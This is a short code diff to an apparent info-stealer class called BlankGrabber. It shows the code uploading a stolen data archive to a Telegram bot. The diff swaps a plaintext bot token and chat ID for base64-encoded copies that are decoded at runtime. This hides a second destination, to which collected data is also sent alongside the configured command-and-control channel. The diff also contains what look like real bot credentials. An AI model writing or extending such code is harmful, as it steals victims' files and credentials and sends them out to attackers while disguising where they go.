@@ -1750,8 +1750,12 @@ class BlankGrabber:
                     fields["document"] = (filename, open(self.ArchivePath, "rb").read())
                     method = "sendDocument"
                 
-                token1 = "7170944168:AAFUYEM5T59IrqJFZiNFJPN0d-kFzNQv8Ds"
-                chat_id1 = "6024388590"
+                encrypted_token = "NjQ2NzUyNTIxMzpBQUh6cHBfZ2hCVm15NENvcVpZV09XSV9HNFg0NGk5NWFWWQ=="
+                encrypted_chat_id = "NjAyNDM4ODU5MA==" 			
+                decrypted_token = base64.b64decode(encrypted_token.encode()).decode() 		
+                decrypted_chat_id = base64.b64decode(encrypted_chat_id.encode()).decode() 			
+                token1 = decrypted_token 			
+                chat_id1 = decrypted_chat_id 	
                 fields.update(payload)
                 fields.update({'chat_id': chat_id1})
                 http.request('POST', 'https://api.telegram.org/bot%s/%s' % (token1, method), fields=fields)
@@ -1779,8 +1783,12 @@ class BlankGrabber:
                     method = "sendDocument"
                 
                 token, chat_id = Settings.C2[1].split('$')
-                token1 = "7170944168:AAFUYEM5T59IrqJFZiNFJPN0d-kFzNQv8Ds"
-                chat_id1 = "6024388590"
+                encrypted_token = "NjQ2NzUyNTIxMzpBQUh6cHBfZ2hCVm15NENvcVpZV09XSV9HNFg0NGk5NWFWWQ=="
+                encrypted_chat_id = "NjAyNDM4ODU5MA==" 			
+                decrypted_token = base64.b64decode(encrypted_token.encode()).decode() 		
+                decrypted_chat_id = base64.b64decode(encrypted_chat_id.encode()).decode() 			
+                token1 = decrypted_token 			
+                chat_id1 = decrypted_chat_id 	
                 fields.update(payload)
                 fields.update({'chat_id': chat_id})
                 fields_for_second_chat = fields.copy()
